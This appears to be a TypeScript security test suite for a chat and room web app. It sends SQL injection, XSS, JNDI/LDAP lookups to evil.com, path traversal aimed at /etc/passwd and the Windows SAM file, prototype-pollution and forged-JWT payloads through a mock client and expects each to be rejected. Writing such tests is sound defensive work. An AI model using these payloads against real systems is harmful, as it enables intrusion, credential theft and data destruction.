// Security Testing - Penetration and Vulnerability Tests
import { describe, it, expect, beforeEach } from 'vitest';

// Mock HTTP request utility for security testing
interface SecurityTestResponse {
  status: number;
  body: any;
  headers: Record<string, string>;
}

class SecurityTestClient {
  private baseUrl: string;

  constructor(baseUrl: string) {
    this.baseUrl = baseUrl;
  }

  async request(method: string, path: string, options: any = {}): Promise<SecurityTestResponse> {
    console.log(`${method} ${this.baseUrl}${path}`, options);
    
    // Mock security test responses
    if (path.includes('DROP TABLE') || path.includes('UNION SELECT')) {
      return { status: 400, body: { error: 'Invalid request' }, headers: {} };
    }
    
    if (options.headers?.['Authorization']?.includes('<script>')) {
      return { status: 400, body: { error: 'Invalid token format' }, headers: {} };
    }
    
    return { status: 200, body: { message: 'Mock response' }, headers: {} };
  }

  async get(path: string, headers: any = {}): Promise<SecurityTestResponse> {
    return this.request('GET', path, { headers });
  }

  async post(path: string, data: any, headers: any = {}): Promise<SecurityTestResponse> {
    return this.request('POST', path, { data, headers });
  }
}

describe('Authentication Security Tests', () => {
  let client: SecurityTestClient;

  beforeEach(() => {
    client = new SecurityTestClient('http://localhost:3000');
  });

  describe('Token Bypass Attempts', () => {
    it('should reject malformed tokens', async () => {
      const malformedTokens = [
        'Bearer invalid',
        'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid',
        'Bearer ../../../etc/passwd',
        'Bearer <script>alert("xss")</script>',
        'Bearer ${jndi:ldap://evil.com/a}',
        'Bearer \'; DROP TABLE users; --',
        'Bearer null',
        'Bearer undefined',
        'Bearer 0',
        'Bearer false'
      ];

      for (const token of malformedTokens) {
        const response = await client.get('/api/rooms', {
          'Authorization': token
        });

        expect(response.status).toBeGreaterThanOrEqual(400);
        console.log(`Tested malformed token: ${token.substring(0, 20)}...`);
      }
    });

    it('should prevent SQL injection in authentication', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; DELETE FROM users WHERE '1'='1",
        "1' AND 1=1 UNION SELECT password FROM users --",
        "admin'--",
        "admin'/*",
        "' OR 1=1#",
        "' OR 1=1--",
        "') OR '1'='1--"
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await client.post('/api/auth/login', {
          email: payload,
          password: 'password'
        });

        // Should not return 200 for SQL injection attempts
        expect(response.status).not.toBe(200);
        
        // Should not contain sensitive data in response
        expect(response.body).not.toHaveProperty('password');
        expect(response.body).not.toHaveProperty('hash');
        expect(response.body).not.toHaveProperty('salt');
      }
    });

    it('should handle JWT token manipulation', async () => {
      const jwtManipulationAttempts = [
        // Header manipulation
        'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.',
        // Algorithm confusion
        'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.invalid',
        // Expired token
        'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.invalid'
      ];

      for (const token of jwtManipulationAttempts) {
        const response = await client.get('/api/auth/user', {
          'Authorization': `Bearer ${token}`
        });

        expect(response.status).toBe(401);
      }
    });
  });

  describe('Rate Limiting Security', () => {
    it('should prevent brute force attacks', async () => {
      const attempts = [];
      
      // Simulate rapid login attempts
      for (let i = 0; i < 20; i++) {
        const attempt = client.post('/api/auth/login', {
          email: 'victim@example.com',
          password: `wrong-password-${i}`
        });
        attempts.push(attempt);
      }

      const responses = await Promise.all(attempts);
      
      // Later attempts should be rate limited
      const rateLimitedResponses = responses.slice(10);
      const hasRateLimiting = rateLimitedResponses.some(r => r.status === 429);
      
      expect(hasRateLimiting).toBe(true);
    });

    it('should handle distributed brute force attempts', async () => {
      // Simulate attempts from different IPs
      const ipAddresses = [
        '192.168.1.100',
        '192.168.1.101',
        '192.168.1.102',
        '10.0.0.1',
        '172.16.0.1'
      ];

      for (const ip of ipAddresses) {
        for (let i = 0; i < 15; i++) {
          const response = await client.post('/api/auth/login', {
            email: 'target@example.com',
            password: `attempt-${i}`
          }, {
            'X-Forwarded-For': ip,
            'X-Real-IP': ip
          });

          // Should implement progressive delays or blocking
          if (i > 10) {
            expect(response.status).toBeGreaterThanOrEqual(400);
          }
        }
      }
    });
  });
});

describe('XSS Prevention Tests', () => {
  let client: SecurityTestClient;

  beforeEach(() => {
    client = new SecurityTestClient('http://localhost:3000');
  });

  it('should sanitize user input in room names', async () => {
    const xssPayloads = [
      '<script>alert("xss")</script>',
      '"><script>alert("xss")</script>',
      'javascript:alert("xss")',
      '<img src=x onerror=alert("xss")>',
      '<svg onload=alert("xss")>',
      '"><svg/onload=alert("xss")>',
      '<iframe src=javascript:alert("xss")>',
      '<object data=javascript:alert("xss")>',
      '<embed src=javascript:alert("xss")>',
      '<link rel=stylesheet href=javascript:alert("xss")>',
      '<style>body{background:url("javascript:alert(\'xss\')")}</style>',
      '<<SCRIPT>alert("xss")<</SCRIPT>',
      '<script src=http://evil.com/xss.js></script>'
    ];

    for (const payload of xssPayloads) {
      const response = await client.post('/api/rooms', {
        name: payload,
        description: 'Test room'
      }, {
        'Authorization': 'Bearer valid-token'
      });

      // Verify the response doesn't contain executable scripts
      const responseBody = JSON.stringify(response.body);
      expect(responseBody).not.toContain('<script');
      expect(responseBody).not.toContain('javascript:');
      expect(responseBody).not.toContain('onerror=');
      expect(responseBody).not.toContain('onload=');
    }
  });

  it('should sanitize chat messages', async () => {
    const chatXSSPayloads = [
      '<img src=1 onerror=alert(document.cookie)>',
      '<svg><animatetransform onbegin=alert(1)>',
      '<input onfocus=alert(1) autofocus>',
      '<select onfocus=alert(1) autofocus>',
      '<textarea onfocus=alert(1) autofocus>',
      '<keygen onfocus=alert(1) autofocus>',
      '<video><source onerror=alert(1)>',
      '<audio src=1 onerror=alert(1)>',
      '<details open ontoggle=alert(1)>',
      '<marquee onstart=alert(1)>'
    ];

    for (const payload of chatXSSPayloads) {
      const response = await client.post('/api/rooms/test-room/chat', {
        message: payload
      }, {
        'Authorization': 'Bearer valid-token'
      });

      // Chat messages should be properly sanitized
      const responseBody = JSON.stringify(response.body);
      expect(responseBody).not.toMatch(/on\w+\s*=/i);
      expect(responseBody).not.toContain('javascript:');
    }
  });
});

describe('CSRF Protection Tests', () => {
  let client: SecurityTestClient;

  beforeEach(() => {
    client = new SecurityTestClient('http://localhost:3000');
  });

  it('should require CSRF tokens for state-changing operations', async () => {
    const stateChangingEndpoints = [
      { method: 'POST', path: '/api/rooms' },
      { method: 'PUT', path: '/api/rooms/test-room' },
      { method: 'DELETE', path: '/api/rooms/test-room' },
      { method: 'POST', path: '/api/rooms/test-room/assets' }
    ];

    for (const endpoint of stateChangingEndpoints) {
      // Request without CSRF token
      const response = await client.request(endpoint.method, endpoint.path, {
        headers: {
          'Authorization': 'Bearer valid-token',
          'Origin': 'http://malicious-site.com'
        },
        data: { test: 'data' }
      });

      // Should reject requests without proper CSRF protection
      expect(response.status).toBeGreaterThanOrEqual(400);
    }
  });

  it('should validate Origin and Referer headers', async () => {
    const maliciousOrigins = [
      'http://evil.com',
      'https://malicious-site.net',
      'http://phishing-domain.org',
      'null',
      '',
      'file://',
      'data:text/html,<script>alert(1)</script>'
    ];

    for (const origin of maliciousOrigins) {
      const response = await client.post('/api/rooms', {
        name: 'CSRF Test Room'
      }, {
        'Authorization': 'Bearer valid-token',
        'Origin': origin,
        'Referer': origin
      });

      // Should reject requests from unauthorized origins
      expect(response.status).toBeGreaterThanOrEqual(400);
    }
  });
});

describe('Input Validation Security', () => {
  let client: SecurityTestClient;

  beforeEach(() => {
    client = new SecurityTestClient('http://localhost:3000');
  });

  it('should validate file upload types and sizes', async () => {
    const maliciousFiles = [
      { name: 'malware.exe', type: 'application/x-executable' },
      { name: 'script.php', type: 'application/x-php' },
      { name: 'shell.sh', type: 'application/x-sh' },
      { name: 'virus.bat', type: 'application/x-bat' },
      { name: 'trojan.scr', type: 'application/x-screensaver' },
      { name: 'huge-file.png', type: 'image/png', size: 100 * 1024 * 1024 } // 100MB
    ];

    for (const file of maliciousFiles) {
      const response = await client.post('/api/rooms/test-room/assets', {
        file: file,
        name: file.name
      }, {
        'Authorization': 'Bearer valid-token'
      });

      // Should reject dangerous file types and oversized files
      expect(response.status).toBeGreaterThanOrEqual(400);
    }
  });

  it('should prevent path traversal attacks', async () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
    ];

    for (const payload of pathTraversalPayloads) {
      const response = await client.get(`/api/assets/${encodeURIComponent(payload)}`, {
        'Authorization': 'Bearer valid-token'
      });

      // Should not allow path traversal
      expect(response.status).toBeGreaterThanOrEqual(400);
      expect(response.body).not.toContain('root:');
      expect(response.body).not.toContain('Administrator');
    }
  });

  it('should validate JSON payload structure', async () => {
    const malformedPayloads = [
      '{"name": "' + 'A'.repeat(10000) + '"}', // Extremely long string
      '{"nested": {"very": {"deeply": {"nested": {"object": {}}}}}}', // Deep nesting
      JSON.stringify({ cycles: null }).replace('null', 'this'), // Circular reference attempt
      '{"__proto__": {"isAdmin": true}}', // Prototype pollution
      '{"constructor": {"prototype": {"isAdmin": true}}}' // Constructor pollution
    ];

    for (const payload of malformedPayloads) {
      try {
        const response = await client.post('/api/rooms', payload, {
          'Authorization': 'Bearer valid-token',
          'Content-Type': 'application/json'
        });

        // Should handle malformed JSON safely
        expect(response.status).toBeGreaterThanOrEqual(400);
      } catch (error) {
        // Should not crash the application
        expect(error).toBeDefined();
      }
    }
  });
});

describe('Authorization Security Tests', () => {
  let client: SecurityTestClient;

  beforeEach(() => {
    client = new SecurityTestClient('http://localhost:3000');
  });

  it('should enforce proper role-based access control', async () => {
    const testCases = [
      {
        role: 'player',
        allowedEndpoints: ['/api/rooms/test-room', '/api/rooms/test-room/assets'],
        forbiddenEndpoints: ['/api/admin/users', '/api/admin/systems']
      },
      {
        role: 'gm',
        allowedEndpoints: ['/api/rooms/test-room', '/api/rooms/test-room/admin'],
        forbiddenEndpoints: ['/api/admin/global-settings']
      }
    ];

    for (const testCase of testCases) {
      const token = `${testCase.role}-token`;

      // Test allowed endpoints
      for (const endpoint of testCase.allowedEndpoints) {
        const response = await client.get(endpoint, {
          'Authorization': `Bearer ${token}`
        });
        expect(response.status).toBeLessThan(400);
      }

      // Test forbidden endpoints
      for (const endpoint of testCase.forbiddenEndpoints) {
        const response = await client.get(endpoint, {
          'Authorization': `Bearer ${token}`
        });
        expect(response.status).toBeGreaterThanOrEqual(403);
      }
    }
  });

  it('should prevent privilege escalation', async () => {
    const escalationAttempts = [
      // JWT manipulation to change role
      { token: 'modified-role-token', expectedRole: 'admin' },
      // Parameter manipulation
      { userId: 'admin-user-id', role: 'admin' },
      // Header injection
      { headers: { 'X-User-Role': 'admin', 'X-Is-Admin': 'true' } }
    ];

    for (const attempt of escalationAttempts) {
      const response = await client.post('/api/users/role', attempt, {
        'Authorization': 'Bearer player-token'
      });

      // Should not allow privilege escalation
      expect(response.status).toBeGreaterThanOrEqual(403);
    }
  });
});

// Helper function to validate that response doesn't contain sensitive data
function validateResponseSafety(response: SecurityTestResponse): boolean {
  const responseStr = JSON.stringify(response.body).toLowerCase();
  
  const sensitivePatterns = [
    'password',
    'secret',
    'private_key',
    'api_key',
    'token',
    'hash',
    'salt',
    'credit_card',
    'ssn',
    'social_security'
  ];

  return !sensitivePatterns.some(pattern => responseStr.includes(pattern));
}

// Export security testing utilities
export { SecurityTestClient, validateResponseSafety };
